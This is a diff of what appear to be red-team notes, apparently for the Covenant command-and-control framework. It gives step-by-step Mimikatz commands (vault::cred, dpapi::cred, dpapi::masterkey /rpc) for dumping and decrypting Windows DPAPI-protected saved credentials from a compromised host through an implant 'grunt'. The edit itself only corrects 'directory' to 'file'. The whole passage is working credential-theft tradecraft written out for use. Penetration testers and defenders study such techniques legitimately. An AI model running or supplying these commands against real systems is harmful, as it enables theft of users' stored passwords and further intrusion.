@@ -64,8 +64,8 @@
 
 - We need a medium integrity grunt
 - `mimikatz vault::cred` will show all services with persisted passwords
-- `ls C:\users\user\appdata\local\microsoft\credentials` will list the passwords files the smallest of the directories is gemerally the one we need.
-- We then go to the tab tak in our grunt. We select Mimikatz from the list and type this task: `"dpapi::cred /in:C:\users\user\appdata\local\microsoft\credentials\DIRECTORY-PREVIOUSLY-CHOSEN"`
+- `ls C:\users\user\appdata\local\microsoft\credentials` will list the passwords files the smallest of the files is gemerally the one we need.
+- We then go to the tab tak in our grunt. We select Mimikatz from the list and type this task: `"dpapi::cred /in:C:\users\user\appdata\local\microsoft\credentials\FILE-PREVIOUSLY-CHOSEN"`
 - From the output of the task we need to keep aside the value of the guidMasterKey 
 - `ls C:\users\user\appdata\roaming\microsoft\protect` this should list a directory with an sid value in the end
 - If you do an ls on this it should list the same path with the guidMasterKey value we previously found. We need to copy the full path, and then we go to task again and using mimikatz we need to type `"dpapi::masterkey /in:C:\users\user\appdata\roaming\microsoft\protect\sid\guidMasterKey /rpc"`
